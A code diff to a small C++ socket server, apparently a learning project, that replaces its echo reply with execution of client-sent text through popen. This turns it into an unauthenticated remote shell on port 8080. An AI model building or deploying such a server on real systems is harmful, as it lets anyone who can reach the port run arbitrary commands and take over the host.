@@ -8,6 +8,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <signal.h>
+
 // TODO: put everything in romanian at the end
 #define PORT 8080
 /*
@@ -18,6 +19,39 @@ struct sockaddr_in {
     char sin_zero[8]; // zero this if you want to
 };
 */
+
+// adding the command execution
+std::string ExecuteCommand(std::string command)
+{
+    if (command.at(0) == 'c' && command.at(1) == 'd')
+    {
+        if (command.length() <= 3)
+        {
+            return "Error:no directory spcified";
+        }
+        command = command.substr(3);
+
+        if (chdir(command.c_str()) == -1)
+        {
+            return "Error:couldn't change directory";
+        }
+        return "changed directory";
+    }
+    else
+    {
+        std::string ExecutedCommand;
+        FILE *pipe = popen(command.c_str(), "r");
+        if (!pipe)
+        {
+            return "Error:couldn't run the command,please try again later";
+        }
+        char buffer[128];
+        while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+            ExecutedCommand += buffer;
+        pclose(pipe);
+        return ExecutedCommand;
+    }
+}
 
 int main()
 {
@@ -78,7 +112,7 @@ int main()
         if (bytes_read > 0)
         {
             MessageFromClient.resize(bytes_read); // Shrink to actual size
-            std::cout << "I received: " << MessageFromClient << std::endl;
+            std::cout << "I received: " << MessageFromClient << "command" << std::endl;
         }
         else if (bytes_read < 0)
         {
@@ -93,7 +127,7 @@ int main()
             break; // exit loop and wait for a new connection
         }
         // test case
-        MessageToClient = "hello " + MessageFromClient;
+        MessageToClient = ExecuteCommand(MessageFromClient);
         size_t bytes_written = write(client, MessageToClient.data(), MessageToClient.size());
         if (bytes_written < 0)
         {
